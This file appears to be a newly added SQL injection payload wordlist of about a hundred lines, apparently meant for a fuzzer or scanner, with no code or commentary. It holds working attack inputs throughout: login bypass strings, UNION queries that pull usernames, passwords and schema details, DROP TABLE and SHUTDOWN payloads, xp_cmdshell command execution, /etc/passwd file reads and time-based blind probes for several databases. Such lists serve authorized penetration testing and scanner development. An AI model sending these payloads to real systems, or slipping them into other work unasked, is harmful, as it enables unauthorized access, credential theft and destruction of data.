@@ -1,0 +1,99 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR 'a'='a
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+') OR ('1'='1
+') OR ('a'='a
+') OR (1=1 --
+' OR 'x'='x
+' OR '1'='1' AND '1'='1
+' OR 1=1 AND 1=1
+' UNION SELECT 1,2,3 --
+' UNION SELECT username, password FROM users --
+' UNION SELECT null, null, null --
+' UNION ALL SELECT null, null, null --
+' UNION ALL SELECT username, password FROM users --
+' UNION ALL SELECT 1, @@version --
+' UNION ALL SELECT 1, current_user() --
+' UNION ALL SELECT database(), version() --
+' UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' AND '1'='1
+' AND 1=1 --
+' AND '1'='1' #
+' AND 1=1/*
+admin' --
+admin' #
+admin' /*
+admin' AND '1'='1
+admin' AND 1=1 --
+admin' OR '1'='1
+admin' OR 1=1 --
+admin') AND ('1'='1
+admin') OR ('1'='1
+') UNION SELECT null --
+') UNION SELECT null, null --
+') UNION SELECT null, null, null --
+') UNION ALL SELECT null --
+') UNION ALL SELECT null, null --
+') UNION ALL SELECT null, null, null --
+admin' UNION SELECT null --
+admin' UNION ALL SELECT null --
+admin' UNION SELECT username, password FROM users --
+') OR ('1'='1') --
+' or 1=1--
+') or ('1'='1
+') or ('a'='a
+admin' OR 1=1
+' OR 'x'='x --
+' AND 1=1 --
+' AND '1'='1 --
+' UNION SELECT username, password FROM accounts --
+' UNION SELECT null, username, password FROM accounts --
+' UNION ALL SELECT @@version --
+' UNION ALL SELECT null, @@version --
+' UNION SELECT 1, @@version --
+' UNION ALL SELECT database(), version() --
+' UNION ALL SELECT schema_name FROM information_schema.schemata --
+' UNION ALL SELECT table_name FROM information_schema.tables --
+' UNION ALL SELECT column_name FROM information_schema.columns --
+' UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+admin' UNION ALL SELECT username, password FROM users --
+'; DROP TABLE users; --
+'; DROP DATABASE test; --
+'; DROP TABLE accounts; --
+'; SELECT * FROM users; --
+'; EXEC xp_cmdshell('dir'); --
+'; SHUTDOWN --
+admin' EXEC xp_cmdshell('dir'); --
+'; WAITFOR DELAY '0:0:5'; --
+' AND SLEEP(5); --
+' OR SLEEP(5); --
+' OR BENCHMARK(1000000,MD5(1)); --
+' OR IF(1=1,SLEEP(5),0); --
+' AND IF(1=1,SLEEP(5),0); --
+' OR IF(1=1,BENCHMARK(1000000,MD5(1)),0); --
+' OR LOAD_FILE('/etc/passwd'); --
+' UNION SELECT LOAD_FILE('/etc/passwd'); --
+' UNION ALL SELECT LOAD_FILE('/etc/passwd'); --
+' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'; --
+' UNION ALL SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'; --
+' OR pg_sleep(5)--
+' AND pg_sleep(5)--
+1 OR pg_sleep(5)--
+1' OR pg_sleep(5)--
+'; SELECT pg_sleep(5)--
+' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+' WAITFOR DELAY '0:0:5'--
+1 WAITFOR DELAY '0:0:5'--
+' AND WAITFOR DELAY '0:0:5'--
+' IF(1=1) WAITFOR DELAY '0:0:5'--
+' IF(ASCII(SUBSTRING((SELECT DB_NAME()), 1, 1)) > 64) WAITFOR DELAY '0:0:5'--
+' AND dbms_pipe.receive_message(('a', 5)) IS NULL--
+' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM DUAL)--
+' OR 1=1 AND DBMS_LOCK.SLEEP(5)--
+' OR UTL_INADDR.get_host_name('localhost') IS NOT NULL AND DBMS_LOCK.SLEEP(5)--
+' AND IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 64, SLEEP(5), 0)--
+' AND IF((SELECT LENGTH(DATABASE())) > 5, SLEEP(5), 0)--
